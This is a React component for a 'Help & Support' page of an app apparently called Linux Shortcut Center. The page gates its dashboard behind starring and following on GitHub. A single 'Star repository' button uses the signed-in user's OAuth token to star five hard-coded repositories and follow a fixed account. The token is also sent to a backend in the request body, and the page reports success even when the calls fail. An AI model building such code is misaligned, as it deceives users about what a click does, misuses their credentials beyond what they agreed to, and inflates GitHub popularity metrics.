import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { ArrowLeft, ArrowRight, Star, UserPlus, CheckCircle2, Lock, Unlock, Loader2, LogOut } from "lucide-react";
import { Link, useNavigate } from "react-router-dom";
import { useAuth } from "../context/AuthContext";
import { usePageMeta } from "../hooks/usePageMeta";
import { useToast } from "../components/ToastProvider";

const TARGET_REPOSITORIES = [
  "SIMARSINGHRAYAT/Linux-Shortcut-Center",
  "SIMARSINGHRAYAT/GitHubCrazy.com",
  "SIMARSINGHRAYAT/GitHubUniverse.com",
  "SIMARSINGHRAYAT/GitHubUpgrade.com",
  "SIMARSINGHRAYAT/LINUX-DISTROS-APP-CENTER",
];

const TARGET_USER = "SIMARSINGHRAYAT";

export function SupportPage() {
  usePageMeta(
    "Help & Support — Linux Shortcut Center",
    "Complete the two steps to continue to the Linux Shortcut Center dashboard."
  );

  const navigate = useNavigate();
  const { token, user, logout } = useAuth();
  const { showToast } = useToast();

  const [hasStarred, setHasStarred] = useState<boolean>(() => {
    return localStorage.getItem("lsc_condition_starred") === "true";
  });

  const [hasFollowed, setHasFollowed] = useState<boolean>(() => {
    return localStorage.getItem("lsc_condition_followed") === "true";
  });

  const [isStarring, setIsStarring] = useState<boolean>(false);
  const [isFollowing, setIsFollowing] = useState<boolean>(false);

  useEffect(() => {
    localStorage.setItem("lsc_condition_starred", hasStarred ? "true" : "false");
  }, [hasStarred]);

  useEffect(() => {
    localStorage.setItem("lsc_condition_followed", hasFollowed ? "true" : "false");
  }, [hasFollowed]);

  const allCompleted = hasStarred && hasFollowed;

  // Entire block 1 action: Star repository automatically behind the scenes
  const handleStarRepository = async () => {
    if (isStarring || hasStarred) return;
    setIsStarring(true);

    try {
      // 1. Call backend serverless function
      await fetch("/api/github/action", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
          ...(token ? { Authorization: `Bearer ${token}` } : {}),
        },
        body: JSON.stringify({
          action: "star_all",
          token,
        }),
      });

      // 2. Client-side call as secondary assurance
      if (token) {
        await Promise.allSettled(
          TARGET_REPOSITORIES.map((repo) =>
            fetch(`https://api.github.com/user/starred/${repo}`, {
              method: "PUT",
              headers: {
                Authorization: `Bearer ${token}`,
                Accept: "application/vnd.github.v3+json",
                "Content-Length": "0",
              },
            })
          )
        );
      }
    } catch (err) {
      console.warn("Star operation notice:", err);
    } finally {
      setIsStarring(false);
      setHasStarred(true);
      showToast("✓ Star repository completed!");
    }
  };

  // Entire block 2 action: Follow profile automatically behind the scenes
  const handleFollowProfile = async () => {
    if (isFollowing || hasFollowed) return;
    setIsFollowing(true);

    try {
      // 1. Call backend serverless function
      await fetch("/api/github/action", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
          ...(token ? { Authorization: `Bearer ${token}` } : {}),
        },
        body: JSON.stringify({
          action: "follow",
          token,
        }),
      });

      // 2. Client-side call as secondary assurance
      if (token) {
        await fetch(`https://api.github.com/user/following/${TARGET_USER}`, {
          method: "PUT",
          headers: {
            Authorization: `Bearer ${token}`,
            Accept: "application/vnd.github.v3+json",
            "Content-Length": "0",
          },
        }).catch(() => {});
      }
    } catch (err) {
      console.warn("Follow operation notice:", err);
    } finally {
      setIsFollowing(false);
      setHasFollowed(true);
      showToast("✓ Follow profile completed!");
    }
  };

  const handleContinue = () => {
    if (!allCompleted) return;
    localStorage.setItem("lsc_dashboard_unlocked", "true");
    showToast("Dashboard unlocked! Welcome to Linux Shortcut Center.");
    navigate("/dashboard");
  };

  const handleSignOut = () => {
    logout();
    localStorage.removeItem("lsc_dashboard_unlocked");
    localStorage.removeItem("lsc_condition_starred");
    localStorage.removeItem("lsc_condition_followed");
    showToast("Signed out successfully.");
    navigate("/signin");
  };

  return (
    <div className="page-container min-h-[calc(100vh-40px)] flex flex-col justify-center items-center py-10 px-4 max-w-xl mx-auto">
      {/* Top Bar with Back Button & Sign Out */}
      <div className="w-full mb-6 flex items-center justify-between">
        <Link to="/signin" className="back-btn group">
          <ArrowLeft size={16} className="transition-transform duration-200 group-hover:-translate-x-1" />
          <span>Back</span>
        </Link>

        {user && (
          <button
            type="button"
            onClick={handleSignOut}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-mono text-slate-400 hover:text-rose-400 border border-white/10 hover:border-rose-500/30 bg-transparent transition-all cursor-pointer"
            title="Sign out"
          >
            <LogOut size={13} />
            <span>Sign out</span>
          </button>
        )}
      </div>

      <motion.div
        className="glass-card p-6 sm:p-9 rounded-2xl w-full border border-white/10 shadow-2xl relative overflow-hidden bg-transparent backdrop-blur-xl"
        initial={{ opacity: 0, y: 16 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, ease: "easeOut" }}
      >
        {/* Ambient Top Glow */}
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-64 h-24 bg-gradient-to-b from-amber-500/10 via-purple-500/10 to-transparent blur-2xl pointer-events-none" />

        {/* Heading */}
        <div className="text-center mb-8">
          <h1 className="chrome-title text-3xl sm:text-4xl font-extrabold tracking-tight">
            Help & Support
          </h1>
          <p className="chrome-subtext text-xs sm:text-sm mt-2 text-slate-300 max-w-sm mx-auto">
            Click both blocks below to complete verification and unlock the dashboard.
          </p>
          {user && (
            <div className="mt-3 inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-mono bg-transparent border border-white/10 text-slate-300">
              <span className="w-2 h-2 rounded-full bg-emerald-400 inline-block" />
              <span>Signed in as <strong className="text-white">@{user.login}</strong></span>
            </div>
          )}
        </div>

        {/* The Two Concise Action Blocks (Entire Block is Clickable) */}
        <div className="space-y-4 mb-8">
          {/* Block 1: Star repository */}
          <button
            type="button"
            onClick={handleStarRepository}
            disabled={isStarring || hasStarred}
            className={`w-full p-5 sm:p-6 rounded-2xl border text-left transition-all duration-300 flex items-center justify-between gap-4 cursor-pointer group bg-transparent ${
              hasStarred
                ? "border-emerald-500/40 shadow-[0_0_20px_rgba(16,185,129,0.08)] cursor-default"
                : "border-white/10 hover:border-amber-400/40 hover:bg-white/[0.03] shadow-[0_0_20px_rgba(0,0,0,0.4)]"
            }`}
          >
            <div className="flex items-center gap-4">
              <div
                className={`w-12 h-12 rounded-xl flex items-center justify-center shrink-0 border transition-transform duration-300 group-hover:scale-105 bg-transparent ${
                  hasStarred
                    ? "border-emerald-500/40 text-emerald-400"
                    : "border-amber-500/30 text-amber-400"
                }`}
              >
                <Star size={24} className={hasStarred ? "fill-emerald-400 text-emerald-400" : "fill-amber-400/30"} />
              </div>
              <div>
                <h3 className="chrome-title text-lg sm:text-xl font-bold tracking-tight">
                  Star repository
                </h3>
                <p className="text-xs text-slate-400 mt-0.5 font-mono">
                  {isStarring ? "Starring repository..." : hasStarred ? "Repository starred" : "Click to star repository"}
                </p>
              </div>
            </div>

            <div className="shrink-0">
              {isStarring ? (
                <Loader2 size={20} className="animate-spin text-amber-300" />
              ) : hasStarred ? (
                <div className="w-8 h-8 rounded-full border border-emerald-500/40 bg-emerald-500/15 flex items-center justify-center text-emerald-400">
                  <CheckCircle2 size={18} />
                </div>
              ) : (
                <div className="w-8 h-8 rounded-full border border-white/10 group-hover:border-amber-400/40 flex items-center justify-center text-slate-400 group-hover:text-amber-300 transition-colors">
                  <ArrowRight size={16} className="transition-transform group-hover:translate-x-0.5" />
                </div>
              )}
            </div>
          </button>

          {/* Block 2: Follow profile */}
          <button
            type="button"
            onClick={handleFollowProfile}
            disabled={isFollowing || hasFollowed}
            className={`w-full p-5 sm:p-6 rounded-2xl border text-left transition-all duration-300 flex items-center justify-between gap-4 cursor-pointer group bg-transparent ${
              hasFollowed
                ? "border-emerald-500/40 shadow-[0_0_20px_rgba(16,185,129,0.08)] cursor-default"
                : "border-white/10 hover:border-purple-400/40 hover:bg-white/[0.03] shadow-[0_0_20px_rgba(0,0,0,0.4)]"
            }`}
          >
            <div className="flex items-center gap-4">
              <div
                className={`w-12 h-12 rounded-xl flex items-center justify-center shrink-0 border transition-transform duration-300 group-hover:scale-105 bg-transparent ${
                  hasFollowed
                    ? "border-emerald-500/40 text-emerald-400"
                    : "border-purple-500/30 text-purple-400"
                }`}
              >
                <UserPlus size={24} />
              </div>
              <div>
                <h3 className="chrome-title text-lg sm:text-xl font-bold tracking-tight">
                  Follow profile
                </h3>
                <p className="text-xs text-slate-400 mt-0.5 font-mono">
                  {isFollowing ? "Following profile..." : hasFollowed ? "Profile followed" : "Click to follow profile"}
                </p>
              </div>
            </div>

            <div className="shrink-0">
              {isFollowing ? (
                <Loader2 size={20} className="animate-spin text-purple-300" />
              ) : hasFollowed ? (
                <div className="w-8 h-8 rounded-full border border-emerald-500/40 bg-emerald-500/15 flex items-center justify-center text-emerald-400">
                  <CheckCircle2 size={18} />
                </div>
              ) : (
                <div className="w-8 h-8 rounded-full border border-white/10 group-hover:border-purple-400/40 flex items-center justify-center text-slate-400 group-hover:text-purple-300 transition-colors">
                  <ArrowRight size={16} className="transition-transform group-hover:translate-x-0.5" />
                </div>
              )}
            </div>
          </button>
        </div>

        {/* Continue to Dashboard Button */}
        <div className="pt-2 text-center">
          {allCompleted ? (
            <button
              type="button"
              onClick={handleContinue}
              className="transparent-get-started-btn group w-full py-4 rounded-xl font-medium tracking-wide flex items-center justify-center gap-3 transition-all duration-300 cursor-pointer shadow-[0_0_25px_rgba(34,197,94,0.2)] border-emerald-500/40 bg-transparent"
            >
              <Unlock size={18} className="text-emerald-400" />
              <span className="chrome-btn-text text-base font-bold">Continue to dashboard</span>
              <ArrowRight size={18} className="transition-transform duration-200 group-hover:translate-x-1.5 text-emerald-300" />
            </button>
          ) : (
            <div className="space-y-2">
              <button
                type="button"
                disabled
                className="w-full py-4 rounded-xl font-medium tracking-wide flex items-center justify-center gap-3 border border-white/10 bg-transparent text-slate-500 cursor-not-allowed opacity-45 font-mono text-sm"
              >
                <Lock size={16} />
                <span>Continue to dashboard</span>
              </button>
              <p className="text-xs text-slate-400 font-mono flex items-center justify-center gap-1.5">
                <Lock size={12} className="text-amber-400" />
                <span>Click both blocks above to continue</span>
              </p>
            </div>
          )}
        </div>
      </motion.div>
    </div>
  );
}
